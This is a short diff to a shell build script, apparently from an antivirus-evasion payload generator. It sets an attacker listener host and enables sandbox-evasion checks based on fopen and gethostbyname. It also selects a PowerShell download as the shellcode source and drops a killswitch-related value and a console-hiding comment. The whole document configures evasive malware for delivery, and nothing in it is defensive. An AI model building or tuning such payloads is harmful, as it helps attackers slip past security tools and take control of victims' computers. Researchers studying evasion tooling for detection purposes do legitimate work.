@@ -20,15 +20,10 @@ LHOST=$GLOBAL_LHOST
 # import feature construction interface
 . build/feature_construction.sh
 
-# add fopen sandbox evasion feature
+# add evasion techniques
 add_evasion fopen_sandbox_evasion
-
-# add gethostbyname killswitch evasion feature
-append_value KVALUE localhost source/evasion.h
 add_evasion gethostbyname_sandbox_evasion
-
-# hide console window
-#add_feature hide_console
+#add_evasion hide_console
 
 # set shellcode source
 set_shellcode_source download_powershell
